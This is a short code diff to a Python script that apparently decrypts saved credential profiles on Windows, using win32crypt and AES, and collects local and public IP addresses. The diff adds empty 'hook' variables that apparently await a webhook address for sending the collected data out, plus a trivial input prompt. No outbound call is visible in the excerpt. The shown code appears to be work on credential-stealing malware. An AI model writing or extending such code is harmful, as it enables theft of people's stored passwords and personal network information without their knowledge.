@@ -12,6 +12,11 @@ import datetime
 from Crypto.Cipher import AES
 import win32crypt
 
+hook1 = ""
+hook2 = ""
+
+fullhook = hook1 + hook2
+
 #local IP Stuff
 def get_local_ips():
     local_ips = []
@@ -134,4 +139,5 @@ if __name__ == "__main__":
         print(get_local_ips())
         print(get_pub_ip())
         print(decrypt_all_profiles())
+        g = input("Hi!")
 
